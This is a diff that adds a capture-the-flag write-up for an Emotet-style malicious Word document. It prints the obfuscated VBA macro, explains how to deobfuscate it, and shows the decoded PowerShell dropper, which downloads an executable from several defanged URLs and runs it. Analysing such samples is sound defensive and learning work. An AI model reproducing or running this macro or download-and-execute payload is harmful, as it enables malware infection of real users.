@@ -263,3 +263,183 @@ This challenge is quite similar to the previus one. we always have to do a buffe
 ![Alt text](./bb1script.png?raw=true "Title")
 
 **MetaCTF{c_strings_are_the_best_strings}**
+
+# Unsolved Challenges
+### Emotet
+They gave us a .doc file saying that it was a malware (obviously not actually dangerous), and the first thing to notice is that an usual practice in malwares is to use macros to execute commands in backgroud, not visible by the users. 
+
+And also this is the case. In fact, by opening the file with Word for example, disabling security blocks for macros (sometimes also disabling Windows Defender is necessary) we can access the VBA code. Let's take a look at it:
+
+```
+Function UUz0RJI()
+      On Error Resume Next
+   For Each RHiKkiLG In A5M2p7jK
+      For Each G75P1US In qJEc7IRb
+         Dim GIYjspC, nB9SYV, LPUPL1N
+         Dim wcQtYfJ, ZuaMkz, i422qG
+         CMCU7SLC = Sqr(imiXhzrE * zBqizFPU)
+         Next
+      Do
+         Dim NV_0VSGS, dYD3M3, RCKlPU
+         Dim bfi2D2, XPmfBPs, iXl0wV6d
+         iipGpOUw = Hex(cIt0mZ9P * EVw6k9)
+   Loop Until lJnXC2 Eqv pI8QsdFp
+   Next
+Ww_KhOVz = G2wST3 + zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6) + iOcZRt
+      On Error Resume Next
+   For Each XzfowjXj In zp_dZk
+      For Each kKK37jlj In iFNokz
+         Dim ACjMki6, YDJ2lwq, qk27CPW
+         Dim LEWEN34j, Zkq8Q0, CNERhtN
+         iF_Q2R = Sqr(iNY2S0CO * oIol86u)
+         Next
+      Do
+         Dim o8hn3O, Yk9pTD, nupvPCDG
+         Dim rYEJFhh, mElhmcvj, ndFX7LK
+         sv4aUaY = Hex(RfaHIM * INDTida)
+   Loop Until wwAJ96d Eqv F3oQHN
+   Next
+      On Error Resume Next
+   For Each YhwOWG In zfCLM4
+      For Each QKaoid3Q In WbRwPX
+         Dim WGF6d2G, XwOpl1zO, ulAph_P
+         Dim tLPpbqc, VskhKsac, rmciw82
+         Xi6OLrb = Sqr(Hz0JGJ * tWbSOE0z)
+         Next
+      Do
+         Dim WncslwCR, YY2uIOT, jfSuDEi
+         Dim Ld7bV4, mbMMG1BT, arK_vvT
+         H4YoHS = Hex(hjCD9u * tCRlqQa)
+   Loop Until wz9OsLI Eqv sEWzE6L
+   Next
+
+VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+      On Error Resume Next
+   For Each WWWjLD2Y In iJu_wF2u
+      For Each GG7zNa7h In B0N8cTL
+         Dim nHUCsc, wwo5Ls, RbjVvIU_
+         Dim j8zii6Oj, oEOUtM9t, rQAHH4m
+         jzVk9wi = Sqr(QtqqzUC * MmjKmO)
+         Next
+      Do
+         Dim V8pbmT8C, WiQiLv, CvKdqE3
+         Dim i6dLHjE, o0sZtof, n8rbwnM
+         l8Qkj8 = Hex(Gz6T7L * wjsnCh9)
+   Loop Until FsqOG10 Eqv SaWMZv
+   Next
+End Function
+Function zG09JQ(hs_BwF)
+      On Error Resume Next
+   For Each VjsX6M In iC5iYoMr
+      For Each KSGqtMd0 In RprNb9K
+         Dim nRE_bsO, Aa0u3KuN, pf67oSY_
+         Dim FaisH6nI, wfTj0Iq, biN3ZrF3
+         kDs4N1k = Sqr(j8il7c * JY9fmw)
+         Next
+      Do
+         Dim K4jEBBDR, fQmGqYN, s04SZnY5
+         Dim wFPfEA9, Ml5Q4U1j, kkRM1V
+         iJboIk = Hex(ZWviFtWW * zsA0jHr)
+   Loop Until qo5aKOsX Eqv fdTYH1i
+   Next
+zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
+      On Error Resume Next
+   For Each rlot_b In padf9ZdD
+      For Each kAzN0lN In mJB56iNs
+         Dim ttcWBT, oIPrb1, bVnnCfI
+         Dim fwjj9vsP, jPow6_T, jDsLUYA3
+         FXk8fah = Sqr(qXibhP5R * kntDa1w)
+         Next
+      Do
+         Dim JL84nnz, PJXYjl, HmK8bGI
+         Dim wXUKHsh, b4f6zt, wuJUHHaF
+         lovEwi = Hex(W58Lb2c * n2Ozc7)
+   Loop Until ULD3P5 Eqv awSicE8
+   Next
+End Function
+```
+
+What we can see here is basically nothing. We have those fancy variables and instructions, a lot of foreach, do-while and function calls. The key idea here is to try and check some variables, and see that they don't actually exist in the document! From that we can conclude there is A LOT of **obfuscation**.
+
+For example take the first foreach statement (`For Each RHiKkiLG In A5M2p7jK ...`), start by searching `RHiKkiLG` in the code: no results. Search in document variables: nothing as well. We may get to the conclusion that this loop is useless. Also by noticing the nested instructions like `Dim GIYjspC, nB9SYV, LPUPL1N` we can support this thesis, because Dim in VBA declarates a variable, and those variables are never used later in the code.
+
+At this point we start to clean the code, deleting all identified useless lines, reaching this cool situation:
+```
+Function UUz0RJI()
+   
+Ww_KhOVz = G2wST3 + zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6) + iOcZRt
+
+VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+     
+End Function
+
+Function zG09JQ(hs_BwF)
+     
+zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
+    
+End Function
+```
+
+Look at that, we now have only 3 instructions ready to be reversed! Again here we have some obfuscation, but it's way more easy to understand (in the first instruction for example, we can delete both `G2wST3` and `iOcZRt` for the same reasoning applied above). We now have 3 main things to focus on:
+* ThisDocument.RjQh9O8r and ThisDocument.YjCTu6 are somehow suspicious, but we can't say nothing on them yet (apart that they must be related to the document itself)
+* CreateObject and Create, used in VBA as in other programming language with objects
+* Replace clearly does what we expect, but how? *Replace(expression, find, replace, ...)*
+
+Now we can simplify the `zG09JQ` function:
+```     
+zG09JQ = Replace(hs_BwF, Replace("$$$$M$e$t$$$a$", "$", ""), "")
+
+- with Replace("$$$$M$e$t$$$a$", "$", "") => "Meta", just delete $s 
+
+zG09JQ = Replace(hs_BwF, "Meta", "")
+```
+
+Clearly, when called, the `zG09JQ` function just deletes the "Meta" substring to the passed string, so we can simplify again the code by removing the function call and modifying the strings passed as parameter, concatenating them:
+```
+VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMe" + "tatsMeta:MetaWMetainMet" + "a3Meta2Meta_MetaM" + "aMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+
+- concat parameters
+
+VXMzL_3u = CreateObject("w" + zG09JQ("inMetamMetagmMetatsMeta:MetaWMetainMeta3Meta2Meta_MetaMaMetaoMetaMetaceMetasMetas")).Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+
+- remove function call and modify string
+
+VXMzL_3u = CreateObject("w" + "inmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+
+- concat again
+
+VXMzL_3u = CreateObject("winmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+```
+
+We can immediately notice the *winmgmts* keyword which indicates a WMI service and *Win32_Maocess* which seems something strange, in fact also googling it gets no results. This means we are in this situation:
+```
+Function UUz0RJI()
+   
+Ww_KhOVz = zG09JQ(ThisDocument.RjQh9O8r + ThisDocument.YjCTu6)
+
+VXMzL_3u = CreateObject("winmgmts:Win32_Maocess").Create(Ww_KhOVz, Hrmr5j, QNm9jL2, qwVG3L)
+     
+End Function
+
+Function zG09JQ(hs_BwF)
+     
+zG09JQ = Replace(hs_BwF, "Meta", "")
+    
+End Function
+```
+
+and nothing more! How we can proceed? We have no other info, and we can't simplify further (`zG09JQ` semplification can't be applied, we don't know ThisDocument parameters).
+That's the point, we don't know them but we do have them, even if we don't know their names (obfuscated) and their values. Moreover, if we try to run the macro we will get an error saying that the object cannot be created.
+
+We should find a way to view the `Ww_KhOVz` variable before is used to create the object, as it's just a concatenation of the 2 ThisDocument parameters with "Meta" substring removed. If you don't know how, `MsgBox` is a standard way to print a dialog in macros, and we can also pass arguments: let's insert a `MsgBox(Ww_KhOVz)` just below the first instruction and see what we get:
+
+![Alt text](./emo.PNG?raw=true "Title")
+
+Interesting, let's copy that! MsgBox interaction to copy text is awful, but you just need to Ctrl+C and paste it somewhere. This highly reminds Base64, so we can try to decode it:
+```
+$zGJ4nJ='lv3wK917';$LJuFr3 = '835';$UPKrwaP='qbocOSC';$rr5KRuw1=$env:userprofile+'\'+$LJuFr3+'.exe';$zEuDiBB0='NUzPobBB';$Xt_Mwq=&('new'+'-obj'+'ect') NEt.wEbcLIeNt;$dj6dmr='hxxp://thinhvuongmedia[dot]com/wp-admin/n2keep7/@hxxps://mnpasalubong[dot]com/wp-admin/nsmz9az032/@hxxp://trunganh[dot]xyz/wp-content/uzq50/@hxxps://iptivicini[dot]com/npkx/jwpy938/@https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt@hxxps://iptivicini[dot]com/npkx/jwpy938/@hxxps://www.cezaevinegonder[dot]com/conf/fd45/'."Spl`IT"('@');$TdXni0R='d47iM40';foreach($ojjUTojB in $dj6dmr){try{$Xt_Mwq."dowNL`OA`Df`iLE"($ojjUTojB, $rr5KRuw1);$nJqw8XQ='JAANQO3W';If ((&('Ge'+'t-Ite'+'m') $rr5KRuw1)."LenG`Th" -ge 29804) {[Diagnostics.Process]::"ST`ArT"($rr5KRuw1);$dfv5j5
+```
+
+Still awful, but we get human-readable strings and if you look closely you can rapidly find an interesting link (https://metaproblems.com/a90d58c20b6014f856c12ed56432ae48/flaggggggggggggg.txt), open it and it will display the flag.
+
+**MetaCTF{aint_no_visual_basic_activex_malware_gonna_hide_from_you}**
